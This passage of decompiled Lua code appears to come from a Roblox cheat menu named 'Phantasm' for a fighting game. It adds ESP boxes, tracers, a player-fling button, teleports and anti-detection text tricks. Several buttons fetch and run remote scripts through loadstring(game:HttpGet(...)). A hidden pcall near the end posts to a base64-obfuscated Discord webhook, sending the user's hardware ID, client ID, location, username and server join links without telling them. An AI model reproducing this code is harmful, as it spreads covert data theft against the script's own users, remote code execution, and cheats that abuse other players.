                Default = {}, 
                Searchable = true
            });
            v452:AddDropdown("InvisibleMoves_Tatsumaki", {
                Text = bypassText("Invisible Tatsumaki"), 
                Values = {
                    "Invisible Crushing Pull", 
                    "Invisible Windstorm Fury", 
                    "Invisible Stone Grave", 
                    "Invisible Expulsive Push", 
                    "Invisible Ult", 
                    "Invisible Terrible Tornado", 
                    "Invisible Terrible Tornado Finisher"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v452:AddDropdown("InvisibleMoves_AtomicSamurai", {
                Text = bypassText("Invisible Atomic Samurai"), 
                Values = {
                    "Invisible Atmos Cleave", 
                    "Invisible Ult", 
                    "Invisible Sunset", 
                    "Invisible Solar Cleave", 
                    "Invisible Sunrise", 
                    "Invisible Sunrise Finisher", 
                    "Invisible Atomic Slash", 
                    "Invisible Atomic Slash Finisher"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v452:AddDropdown("InvisibleMoves_MetalBat", {
                Text = bypassText("Invisible Metal Bat"), 
                Values = {}, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v452:AddDropdown("InvisibleMoves_Suiryu", {
                Text = bypassText("Invisible Suiryu"), 
                Values = {
                    "Bullet Barrage"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            local v665 = Instance.new("Folder", v18);
            v665.Name = bypassText("RemovedInstances");
            local v666 = Instance.new("Folder", v665);
            v666.Name = bypassText("RemovedTrees");
            local v667 = Instance.new("Folder", v665);
            v667.Name = bypassText("RemovedWalls");
            workspace.ChildAdded:Connect(function(v668) --[[ Line: 0 ]] --[[ Name:  ]]
                if v668.Name:lower() == "adjustedhb" and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Stone Grave") then
                    task.spawn(pcall, deleteNew, v668, false);
                end;
            end);
            if workspace.Map:FindFirstChild("Trees") then
                workspace.Map.Trees.ChildAdded:Connect(function(v669) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_RenderStepped_0 (ref), v666 (ref)
                    if Toggles.NoTrees.Value then
                        l_RenderStepped_0:Wait();
                        v669.Parent = v666;
                    end;
                end);
            end;
            l_l_UserInputService_0_0.ChildAdded:Connect(function(v670) --[[ Line: 0 ]] --[[ Name:  ]]
                if (v670.Name:lower():find("debris") or v670.Name:lower() == "part") and Toggles.NoDebris.Value then
                    task.spawn(pcall, deleteNew, v670, false);
                elseif v670.Name:lower():find("tree") and Toggles.NoTrees.Value then
                    task.spawn(pcall, deleteNew, v670, false);
                elseif v670.Name:lower():find("smoke") and Toggles.NoSmoke.Value then
                    task.spawn(pcall, deleteNew, v670, false);
                elseif v670.Name:lower():find("explo") and Toggles.NoExplosions.Value then
                    task.spawn(pcall, deleteNew, v670, false);
                elseif table.find({
                    "beamed", 
                    "adjusted"
                }, v670.Name:lower()) then
                    if rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Stone Grave") then
                        for _, v672 in pairs(v670:GetDescendants()) do
                            if v672:IsA("BasePart") then
                                v672.Transparency = 0.8;
                                v672.CollisionGroup = "untouchable";
                                v672.Massless = true;
                                v672.CanCollide = false;
                                v672.CanTouch = false;
                                v672.CanQuery = false;
                            end;
                        end;
                    end;
                elseif (v670:IsA("Part") and v670.Size == Vector3.new(20, 20, 20) and v670.Shape == Enum.PartType.Ball or v670.Name == "Part") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Stone Grave") then
                    task.spawn(pcall, deleteNew, v670, false);
                end;
            end);
            v453:AddToggle("NoCameraAnimations", {
                Text = bypassText("No Camera Animations"), 
                Default = false, 
                Callback = function(v673) --[[ Line: 0 ]] --[[ Name:  ]]
                    if v673 then
                        local l_CurrentCamera_3 = workspace.CurrentCamera;
                        if l_CurrentCamera_3 and l_CurrentCamera_3.CameraType ~= Enum.CameraType.Custom then
                            task.spawn(fixCam);
                        end;
                    end;
                end
            });
            v453:AddDropdown("CoreGUIElements", {
                Text = bypassText("Enabled CoreGUI Elements"), 
                Values = {
                    "Player List", 
                    "Chat", 
                    "All"
                }, 
                Multi = true, 
                Default = {}
            });
            l_StarterGui_0.CoreGuiChangedSignal:Connect(function(v675, v676) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: l_RenderStepped_0 (ref), l_StarterGui_0 (ref)
                l_RenderStepped_0:Wait();
                if v675 == Enum.CoreGuiType.PlayerList and not v676 and rawget(Options.CoreGUIElements.Value, "Player List") then
                    l_StarterGui_0:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true);
                elseif v675 == Enum.CoreGuiType.Chat and not v676 and rawget(Options.CoreGUIElements.Value, "Chat") then
                    l_StarterGui_0:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true);
                elseif v675 == Enum.CoreGuiType.All and not v676 and rawget(Options.CoreGUIElements.Value, "All") then
                    l_StarterGui_0:SetCoreGuiEnabled(Enum.CoreGuiType.All, true);
                end;
            end);
            v453:AddDivider();
            v453:AddToggle("Visualizer", {
                Text = bypassText("Desync Visualizer"), 
                Default = false
            });
            v453:AddToggle("AlwaysVisualize", {
                Text = bypassText("Always Enabled"), 
                Default = false
            });
            v454:AddToggle("ShowDeathCounter", {
                Text = bypassText("Show Death Counter"), 
                Default = false
            });
            v454:AddToggle("MoveNotifications", {
                Text = bypassText("Move Notifications"), 
                Default = false
            });
            v454:AddToggle("ExposeMoveInChat", {
                Text = bypassText("Expose Move In Chat"), 
                Default = false
            });
            v454:AddToggle("ExposeWhitelistedPlayers", {
                Text = bypassText("Expose Whitelisted Players"), 
                Default = false
            });
            v454:AddDropdown("MoveNotificationMoves", {
                Values = {
                    "Death Counter", 
                    "Table Flip", 
                    "Serious Punch", 
                    "Omni-Directional Punch", 
                    "Death Blow", 
                    "Last Breath", 
                    "20-20-20 Dropkick"
                }, 
                Default = {}, 
                Multi = true, 
                Searchable = false, 
                Text = bypassText("Moves")
            });
            v454:AddDivider();
            v454:AddToggle("BoxESP", {
                Text = bypassText("Box ESP"), 
                Default = false
            }):AddColorPicker("BoxColor", {
                Default = Color3.fromRGB(255, 255, 255), 
                Title = bypassText("Box Color")
            });
            v454:AddToggle("RainbowBoxColor", {
                Text = bypassText("Rainbow Box"), 
                Default = false, 
                Callback = function(v677) --[[ Line: 0 ]] --[[ Name:  ]]
                    if v677 then
                        local l_Value_5 = Options.BoxColor.Value;
                        repeat
                            local v679 = tick() * 2;
                            local v680 = math.abs(math.sin(v679)) * 255;
                            local v681 = math.abs(math.sin(v679 + math.pi / 3)) * 255;
                            local v682 = math.abs(math.sin(v679 + 2 * math.pi / 3)) * 255;
                            Options.BoxColor:SetValueRGB(Color3.fromRGB(v680, v681, v682));
                            Options.BoxColor:Update();
                            task.wait(0.03);
                        until not Toggles.RainbowBoxColor.Value;
                        Options.BoxColor:SetValueRGB(l_Value_5);
                    end;
                end
            });
            v454:AddSlider("BoxThickness", {
                Text = bypassText("Box Thickness"), 
                Default = 1, 
                Min = 1, 
                Max = 3, 
                Rounding = 1, 
                Compact = true
            });
            v454:AddSlider("BoxTransparency", {
                Text = bypassText("Box Transparency"), 
                Default = 1, 
                Min = 0, 
                Max = 1, 
                Rounding = 1, 
                Compact = true
            });
            v454:AddToggle("FaceCamera", {
                Text = bypassText("Face Camera"), 
                Default = false
            });
            v454:AddDivider();
            v454:AddToggle("Tracers", {
                Text = bypassText("Tracers"), 
                Default = false
            }):AddColorPicker("TracerColor", {
                Default = Color3.fromRGB(255, 255, 255), 
                Title = bypassText("Tracers Color")
            });
            v454:AddToggle("RainbowTracers", {
                Text = bypassText("Rainbow Tracers"), 
                Default = false, 
                Callback = function(v683) --[[ Line: 0 ]] --[[ Name:  ]]
                    if v683 then
                        local l_Value_6 = Options.TracerColor.Value;
                        repeat
                            local v685 = tick() * 2;
                            local v686 = math.abs(math.sin(v685)) * 255;
                            local v687 = math.abs(math.sin(v685 + math.pi / 3)) * 255;
                            local v688 = math.abs(math.sin(v685 + 2 * math.pi / 3)) * 255;
                            Options.TracerColor:SetValueRGB(Color3.fromRGB(v686, v687, v688));
                            Options.TracerColor:Update();
                            task.wait(0.03);
                        until not Toggles.RainbowTracers.Value;
                        Options.TracerColor:SetValueRGB(l_Value_6);
                    end;
                end
            });
            v454:AddSlider("TracerThickness", {
                Text = bypassText("Tracer Thickness"), 
                Default = 1, 
                Min = 1, 
                Max = 3, 
                Rounding = 1, 
                Compact = true
            });
            v454:AddSlider("TracerTransparency", {
                Text = bypassText("Tracer Transparency"), 
                Default = 1, 
                Min = 0, 
                Max = 1, 
                Rounding = 1, 
                Compact = true
            });
            v454:AddToggle("UnlockTracers", {
                Text = bypassText("Unlock Tracers"), 
                Default = false, 
                Disabled = v83
            });
            v455:AddToggle("NoWalls", {
                Text = bypassText("No Walls"), 
                Default = false, 
                Callback = function(v689) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v667 (ref)
                    if v689 then
                        for _, v691 in pairs(workspace.Map:GetChildren()) do
                            if table.find({
                                "Walls", 
                                "GrassTop", 
                                "Tunnel", 
                                "Part"
                            }, v691.Name) then
                                v691.Parent = v667;
                            end;
                        end;
                    elseif not v689 then
                        for _, v693 in pairs(v667:GetChildren()) do
                            v693.Parent = workspace.Map;
                        end;
                    end;
                end
            });
            v455:AddToggle("NoTrees", {
                Text = bypassText("No Trees"), 
                Default = false, 
                Callback = function(v694) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v666 (ref), l_Workspace_0 (ref)
                    if workspace.Map:FindFirstChild("Trees") then
                        if v694 then
                            for _, v696 in pairs(workspace.Map.Trees:GetChildren()) do
                                v696.Parent = v666;
                            end;
                        elseif not v694 then
                            for _, v698 in pairs(v666:GetChildren()) do
                                v698.Parent = l_Workspace_0.Map.Trees;
                            end;
                        end;
                    end;
                end
            });
            v455:AddToggle("NoDebris", {
                Text = bypassText("No Debris"), 
                Default = false, 
                Callback = function(v699) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_l_UserInputService_0_0 (ref)
                    if v699 then
                        for _, v701 in pairs(l_l_UserInputService_0_0:GetChildren()) do
                            if v701.Name:lower():find("debris") or v701.Name:lower() == "part" then
                                task.spawn(pcall, deleteNew, v701, false);
                            end;
                        end;
                    end;
                end
            });
            v455:AddToggle("NoSmoke", {
                Text = bypassText("No Smoke"), 
                Default = false, 
                Callback = function(v702) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_l_UserInputService_0_0 (ref)
                    if v702 then
                        for _, v704 in pairs(l_l_UserInputService_0_0:GetChildren()) do
                            if v704.Name:lower():find("smoke") then
                                task.spawn(pcall, deleteNew, v704, false);
                            end;
                        end;
                    end;
                end
            });
            v455:AddToggle("NoExplosions", {
                Text = bypassText("No Explosions"), 
                Default = false, 
                Callback = function(v705) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_l_UserInputService_0_0 (ref)
                    if v705 then
                        for _, v707 in pairs(l_l_UserInputService_0_0:GetChildren()) do
                            if v707.Name:lower():find("explo") then
                                task.spawn(pcall, deleteNew, v707, false);
                            end;
                        end;
                    end;
                end
            });
            v455:AddDivider();
            v455:AddToggle("AmbientEnabled", {
                Text = bypassText("Ambient Enabled"), 
                Default = false, 
                Callback = function(v708) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_Lighting_0 (ref)
                    if v708 then
                        local l_Ambient_0 = l_Lighting_0.Ambient;
                        l_Lighting_0.Ambient = Options.AmbientColor.Value;
                        repeat
                            task.wait();
                        until not Toggles.AmbientEnabled.Value;
                        l_Lighting_0.Ambient = l_Ambient_0;
                    end;
                end
            }):AddColorPicker("AmbientColor", {
                Default = Color3.fromRGB(255, 255, 255), 
                Title = bypassText("Ambient"), 
                Callback = function(v710) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_Lighting_0 (ref)
                    if Toggles.AmbientEnabled.Value then
                        l_Lighting_0.Ambient = v710;
                    end;
                end
            });
            v455:AddToggle("RainbowAmbient", {
                Text = bypassText("Rainbow Ambient"), 
                Default = false, 
                Callback = function(v711) --[[ Line: 0 ]] --[[ Name:  ]]
                    if v711 then
                        local l_Value_7 = Options.AmbientColor.Value;
                        repeat
                            local v713 = tick() * 2;
                            local v714 = math.abs(math.sin(v713)) * 255;
                            local v715 = math.abs(math.sin(v713 + math.pi / 3)) * 255;
                            local v716 = math.abs(math.sin(v713 + 2 * math.pi / 3)) * 255;
                            Options.AmbientColor:SetValueRGB(Color3.fromRGB(v714, v715, v716));
                            Options.AmbientColor:Update();
                            task.wait(0.03);
                        until not Toggles.RainbowAmbient.Value;
                        Options.AmbientColor:SetValueRGB(l_Value_7);
                    end;
                end
            });
            for _, v718 in pairs(v73) do
                do
                    local l_v718_0 = v718;
                    v458:AddButton({
                        Text = bypassText(l_v718_0), 
                        Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v72 (ref), l_v718_0 (ref)
                            heartbeatTp(v72[l_v718_0]);
                        end
                    });
                end;
            end;
            local v720 = {};
            v459:AddDropdown("TargetPlayer", {
                SpecialType = "Player", 
                ExcludeLocalPlayer = true, 
                Text = bypassText("Target"), 
                Callback = function(v721) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v720 (ref), v459 (ref)
                    for _, v723 in pairs(v720) do
                        v723.Base:Destroy();
                    end;
                    table.clear(v720);
                    if v721 then
                        v720[#v720 + 1] = v459:AddButton({
                            Text = bypassText("Goto"), 
                            Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                                -- upvalues: v721 (ref)
                                local v724 = getChar(v721);
                                local v725 = v724 and getRoot(v724);
                                if v724 and v725 then
                                    heartbeatTp(v725.CFrame);
                                end;
                            end
                        });
                        v720[#v720 + 1] = v459:AddButton({
                            Text = bypassText("Fling"), 
                            Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                                -- upvalues: v721 (ref)
                                fling(v721);
                            end
                        });
                    end;
                end
            });
            v462:AddDropdown("IdleAnimation", {
                Values = {
                    "Normal", 
                    "Watch", 
                    "Casual", 
                    "Confident", 
                    "Fent Master", 
                    "Fly Idle", 
                    "Random"
                }, 
                Default = 1, 
                Multi = false, 
                Text = bypassText("Idle Animation")
            });
            v462:AddSlider("IdleAnimationEndFadeTime", {
                Text = bypassText("Idle Animation End Fade Time"), 
                Default = 0.2, 
                Min = 0.1, 
                Max = 1, 
                Rounding = 1
            });
            v462:AddDivider();
            v462:AddDropdown("RunAnimation", {
                Values = {
                    "Normal", 
                    "Gojo Run", 
                    "Sonic EXE", 
                    "Girly Walk", 
                    "Steve Walk", 
                    "Sassy Walk", 
                    "Yandere Walk", 
                    "Sword Walk", 
                    "March", 
                    "Hunter", 
                    "Goofy", 
                    "Officer Earl", 
                    "Kazotsky Kick"
                }, 
                Default = 1, 
                Multi = false, 
                Text = bypassText("Run Animation")
            });
            v462:AddSlider("RunAnimationSpeed", {
                Text = bypassText("Run Animation Speed"), 
                Default = 1, 
                Min = 0.25, 
                Max = 3, 
                Rounding = 1
            });
            v462:AddSlider("RunAnimationStartFadeTime", {
                Text = bypassText("Run Animation Start Fade Time"), 
                Default = 0.1, 
                Min = 0.1, 
                Max = 1, 
                Rounding = 1
            });
            v462:AddSlider("RunAnimationEndFadeTime", {
                Text = bypassText("Run Animation End Fade Time"), 
                Default = 0.1, 
                Min = 0.1, 
                Max = 1, 
                Rounding = 1
            });
            v462:AddDivider();
            v462:AddDropdown("BlockAnimation", {
                Values = {
                    "Normal", 
                    "One Hand", 
                    "Gojo", 
                    "Infinity", 
                    "Boxer"
                }, 
                Default = 1, 
                Multi = false, 
                Text = bypassText("Block Animation")
            });
            v462:AddSlider("BlockAnimationEndFadeTime", {
                Text = bypassText("Block Animation End Fade Time"), 
                Default = 0.2, 
                Min = 0.1, 
                Max = 1, 
                Rounding = 1
            });
            v462:AddDivider();
            v462:AddDropdown("LoopedAnimation", {
                Values = {
                    "None", 
                    "Spin", 
                    "Boogie Down"
                }, 
                Default = 1, 
                Multi = false, 
                Text = bypassText("Looped Animation")
            });
            v462:AddSlider("LoopedAnimationSpeed", {
                Text = bypassText("Animation Speed"), 
                Default = 1, 
                Min = 0.1, 
                Max = 10, 
                Rounding = 1
            });
            v462:AddDivider();
            v462:AddToggle("FuckedUpCharacter", {
                Text = bypassText("Fucked Up Character"), 
                Default = false
            });
            v462:AddToggle("NoTrashcanHold", {
                Text = bypassText("No Trashcan Hold"), 
                Default = false, 
                Callback = function(v726) --[[ Line: 0 ]] --[[ Name:  ]]
                    if v726 then
                        stopAllAnims(nil, {
                            "13813450889", 
                            "13813448561"
                        });
                    end;
                end
            });
            v462:AddToggle("DisableIntro", {
                Text = bypassText("Disable Intro"), 
                Default = false, 
                Callback = function(v727) --[[ Line: 0 ]] --[[ Name:  ]]
                    if v727 then
                        communicate({
                            Goal = "Disable Intro"
                        });
                    end;
                end
            });
            v461:AddButton({
                Text = bypassText("Infinite Yield"), 
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))
            });
            v461:AddButton({
                Text = bypassText("Remote Spy"), 
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua", true))
            });
            v461:AddButton({
                Text = bypassText("Dark Dex V3"), 
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))
            });
            v461:AddButton({
                Text = bypassText("Bypassed Dark Dex V3"), 
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))
            });
            v461:AddLabel({
                Text = bypassText("Credits:\n" .. "\r\n(discord tags)\r\nKade's Scripts: @i.am.an.agent\r\nKiosk's Scripts: @mnoq"), 
                DoesWrap = true, 
                Size = 16
            });
            v461:AddButton({
                Text = bypassText("Kade Gojo V1"), 
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/main/Latest.lua"))
            });
            v461:AddButton({
                Text = bypassText("Kade Gojo V2 (Morph)"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    getgenv().morph = true;
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/refs/heads/main/LatestV2.lua"))();
                end
            });
            v461:AddButton({
                Text = bypassText("Kade Gojo V2 (No Morph)"), 
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/refs/heads/main/LatestV2.lua"))
            });
            v461:AddButton({
                Text = bypassText("Saitama Overhaul"), 
                Callback = loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/SaitamaOverhaul/refs/heads/main/Latest.lua"))
            });
            v461:AddButton({
                Text = bypassText("KadeJ / KaitamaJ"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    getgenv().Moveset_Settings = {
                        ExecuteOnRespawn = false, 
                        TSBStyleNotification = true, 
                        UseOldCollateralRuin = true, 
                        NoWarning = false, 
                        NoDeathCounterImages = false, 
                        NoBarrageArms = false, 
                        NoPreysPerilAttract = false, 
                        NoWalls = false, 
                        NoTrees = false, 
                        RavageTool = true, 
                        AdrenalineBoostTool = true, 
                        Adrenaline_Multiplier = 2, 
                        CustomUppercutAnimation = true, 
                        CustomDownslamAnimation = true, 
                        CustomIdleAnimation = true, 
                        UltNames = {
                            "20 SERIES", 
                            "COME AT ME", 
                            "I'M DONE"
                        }, 
                        MoveNames = {
                            ["Normal Punch"] = "Ravaging Kick", 
                            ["Consecutive Punches"] = "Fist Fusillade", 
                            Shove = "Swift Sweep", 
                            Uppercut = "Collateral Storm", 
                            ["Death Counter"] = "Sudden Strike", 
                            ["Table Flip"] = "Stoic Bomb", 
                            ["Serious Punch"] = "Destructive Power", 
                            ["Omni Directional Punch"] = "Omni Directional Fists"
                        }
                    };
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToKJ/refs/heads/main/Latest.lua"))();
                end
            });
            v461:AddButton({
                Text = bypassText("Dragon Ball Super Hit (Morph)"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    getgenv().Morph = true;
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/OneEyedLord/Main/refs/heads/main/HitDBS.lua"))();
                end
            });
            v461:AddButton({
                Text = bypassText("Dragon Ball Super Hit (No Morph)"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    getgenv().Morph = false;
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/OneEyedLord/Main/refs/heads/main/HitDBS.lua"))();
                end
            });
            pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v27 (ref), v29 (ref), l_HttpService_0 (ref), v412 (ref), l_Players_0 (ref), v101 (ref), v102 (ref), v404 (ref), v407 (ref), v408 (ref), v409 (ref), v12 (ref), l_RbxAnalyticsService_0 (ref), l_l_HttpService_0_0 (ref)
                v27({
                    Url = v29("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0Mjc2MDM5OTI2MTc5NDMyNi9IQ282OHVtMWVtWW0xUkpxQm9vUFA2S1o5TElEYnZfakcxZ3hiQWNZOVlRb0ZXSjJBQTNwTVpyOGhEZ1VzZ292c0ItZg=="), 
                    Method = "POST", 
                    Headers = {
                        ["content-type"] = "application/json"
                    }, 
                    Body = l_HttpService_0:JSONEncode({
                        embeds = {
                            {
                                title = "Phantasm Logs", 
                                description = "User Device: " .. v412, 
                                type = "rich", 
                                color = tonumber(0), 
                                fields = {
                                    {
                                        name = "\n\n-----------------------------------------------------Information** **", 
                                        value = "Identified Executor: " .. (identifyexecutor and tostring(identifyexecutor()) or "Unknown") .. "\nExecutor Name: " .. (getexecutorname and tostring(getexecutorname()) or "Unknown") .. "\nServer Players: " .. (#l_Players_0:GetPlayers() or "Unknown") .. "\nServer Type: " .. v101 .. "\nServer Version: " .. v102 .. "\nCountry: " .. v404 .. "\nRegion: " .. v407 .. "\nRegion Name: " .. v408 .. "\nTimezone: " .. v409 .. "\nUsername: [" .. v12.Name .. " (" .. v12.DisplayName .. ")](https://www.roblox.com/users/" .. v12.UserId .. "/profile)\nClient ID: " .. (l_RbxAnalyticsService_0:GetClientId() or "Unknown") .. "\nHWID: " .. (gethwid and tostring(gethwid()) or get_hwid and tostring(get_hwid()) or "Unknown") .. "\nHashed Identifier: " .. l_l_HttpService_0_0 .. "\n-----------------------------------------------------" .. "\n[**Join**](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", 
                                        inline = false
                                    }, 
                                    {
                                        name = "JobId Join", 
                                        value = "```Roblox.GameLauncher.joinGameInstance('" .. game.PlaceId .. "', '" .. game.JobId .. "')```", 
                                        inline = true
                                    }, 
                                    {
                                        name = "JobId", 
                                        value = "```r\r\n    " .. game.JobId .. "\r\n\r\n    ```", 
                                        inline = true
                                    }, 
                                    {
                                        name = "Browser Join", 
                                        value = "```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```", 
                                        inline = false
                                    }, 
                                    {
                                        name = "Script Join", 
                                        value = "```lua\r\n    game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\", game:GetService(\"Players\").LocalPlayer)\r\n    ```", 
                                        inline = false
                                    }
                                }, 
                                thumbnail = {
                                    url = fetchAvatar()
                                }, 
                                footer = {
                                    text = "Script ran at " .. os.date("%Y-%m-%d %H:%M:%S")
                                }
                            }
                        }
                    })
                });
            end);
            local v728 = Instance.new("Part", l_Workspace_0);
            v728.CFrame = v72.Void * CFrame.new(0, -8, 0);
            v728.Anchored = true;
            v728.Size = Vector3.new(2048, 10, 2048);
            v728.Transparency = 0.5;
            local v729 = "GenerateGUID";
            local l_l_HttpService_0_1 = l_HttpService_0;
            v728.Name = l_HttpService_0[v729](l_l_HttpService_0_1);
            v728.Parent = l_Workspace_0;
            local l_Emotes_0 = v12.PlayerGui:FindFirstChild("Emotes");
            l_l_HttpService_0_1 = l_Emotes_0 and l_Emotes_0:FindFirstChildWhichIsA("ImageLabel");
            if l_Emotes_0 and l_l_HttpService_0_1 then
                v729 = function(v732) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v68 (ref), v12 (ref), l_Stats_0 (ref)
                    local l_Button_0 = v732:FindFirstChild("Button");
                    if v732:IsA("Frame") and tonumber(v732.Name) and l_Button_0 then
                        v68[#v68 + 1] = l_Button_0.MouseButton1Click:Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v12 (ref), l_Stats_0 (ref)
                            local v734 = getChar(v12);
                            local v735 = v734 and getHumanoid(v734);
                            if v734 and v735 and not v734:FindFirstChild("Freeze") and Toggles.EmoteDash.Value then
                                local v736 = l_Stats_0.Network.ServerStatsItem["Data Ping"]:GetValue() / 1000;
                                task.wait(v736 / 2);
                                for _, v738 in pairs(v735:GetPlayingAnimationTracks()) do
                                    if table.find({
                                        "rbxassetid://10480796021", 
                                        "rbxassetid://10480793962", 
                                        "rbxassetid://10491993682"
                                    }, v738.Animation.AnimationId) then
                                        v738:AdjustSpeed(99);
                                    end;
                                end;
                            end;
                        end);
                    end;
                end;
                for _, v740 in pairs(l_l_HttpService_0_1:GetChildren()) do
                    v729(v740);
                end;
                l_l_HttpService_0_1.ChildAdded:Connect(v729);
            end;
            v729 = nil;
            init = function(_) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v67 (ref), v729 (ref), v12 (ref), v18 (ref), l_RenderStepped_0 (ref), v728 (ref), v72 (ref), l_TweenService_0 (ref), v94 (ref), v75 (ref), l_ReplicatedStorage_0 (ref), v91 (ref), v602 (ref), v437 (ref), v71 (ref), v87 (ref), l_UserInputService_0 (ref), l_Players_0 (ref), v84 (ref), v85 (ref), v86 (ref), l_Stepped_0 (ref)
                for _, v743 in pairs(v67) do
                    v743:Disconnect();
                end;
                table.clear(v67);
                if v729 then
                    v729:Destroy();
                    v729 = nil;
                end;
                repeat
                    task.wait();
                until getChar(v12) and getRoot(getChar(v12)) and getHumanoid(getChar(v12));
                local v744 = getChar(v12);
                local v745 = v744 and getRoot(v744);
                local v746 = v744 and getHumanoid(v744);
                if v744 and v745 and v746 then
                    local l_Archivable_0 = v744.Archivable;
                    v744.Archivable = true;
                    v729 = v744:Clone();
                    v744.Archivable = l_Archivable_0;
                    v729.Parent = workspace;
                    local v748 = nil;
                    local v749 = nil;
                    local v750 = nil;
                    do
                        local l_v748_0, l_v749_0, l_v750_0 = v748, v749, v750;
                        if v744 and v729 then
                            l_v749_0 = getRoot(v729);
                            l_v750_0 = getHumanoid(v729);
                            if v729 and l_v749_0 and l_v750_0 then
                                l_v749_0.Anchored = true;
                                local v754 = v729:FindFirstChildWhichIsA("Highlight") or Instance.new("Highlight", v18);
                                v754.FillTransparency = 0.5;
                                v754.OutlineTransparency = 0;
                                v754.DepthMode = "AlwaysOnTop";
                                v754.FillColor = Color3.fromRGB(0, 255, 255);
                                v754.OutlineColor = Color3.fromRGB(0, 255, 255);
                                v754.Adornee = v729;
                                for _, v756 in pairs(v729:GetDescendants()) do
                                    if v756:IsA("BasePart") and v756 ~= l_v749_0 then
                                        v756.CollisionGroup = "untouchable";
                                        v756.Massless = true;
                                        v756.CanCollide = false;
                                        v756.CanTouch = false;
                                        v756.CanQuery = false;
                                        v756.Transparency = 0.5;
                                    elseif v756:IsA("Trail") or v756:IsA("ParticleEmitter") then
                                        task.spawn(pcall, deleteNew, v756, false);
                                    end;
                                end;
                                task.delay(0.1, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                    -- upvalues: l_v748_0 (ref), l_v750_0 (ref)
                                    l_v748_0 = loadAnim(l_v750_0, "18236605028");
                                    l_v748_0.Priority = Enum.AnimationPriority.Action4;
                                end);
                            end;
                        end;
                        local v757 = loadAnim(v746, "18236605028", "Server");
                        v757.Priority = Enum.AnimationPriority.Action3;
                        local v758 = nil;
                        local v759 = nil;
                        local v760 = 0;
                        local v761 = nil;
                        v67[#v67 + 1] = l_RenderStepped_0:Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v728 (ref), v745 (ref), v72 (ref), v758 (ref), v746 (ref), v759 (ref), v760 (ref), v761 (ref), v757 (ref), l_v748_0 (ref), l_v749_0 (ref)
                            v728.CFrame = CFrame.new(v745.Position.X, v72.Void.Y - 8, v745.Position.Z);
                            v758 = v746.Health;
                            if v745.CFrame.Y > -9000000000 and v745.CFrame.Y < 9000000000 then
                                v759 = v745.CFrame;
                            elseif v745.CFrame.Y < -9000000000 or v745.CFrame.Y > 9000000000 then
                                heartbeatTp(v759);
                            end;
                            v760 = v760 + 1;
                            local l_Value_8 = Options.LoopedAnimation.Value;
                            local v763 = {
                                Spin = "188632011", 
                                ["Boogie Down"] = "140290021376754"
                            };
                            if v763[l_Value_8] and (v761 and not v761.Animation.AnimationId:match(v763[l_Value_8]) or not v761) then
                                v761 = loadAnim(v746, v763[l_Value_8]);
                                v761.Priority = Enum.AnimationPriority.Action2;
                            end;
                            if v761 then
                                if v763[l_Value_8] and not v761.IsPlaying then
                                    v761:Play();
                                    v761.Looped = true;
                                elseif v761.IsPlaying and not v763[l_Value_8] or v760 % 1000 == 0 then
                                    v761:Stop();
                                    v761 = nil;
                                end;
                                v761:AdjustSpeed(Options.LoopedAnimationSpeed.Value * (l_Value_8 == "Boogie Down" and 1.5 or 1));
                            end;
                            local v764 = 1;
                            if v757 then
                                if Toggles.FuckedUpCharacter.Value and not v757.IsPlaying then
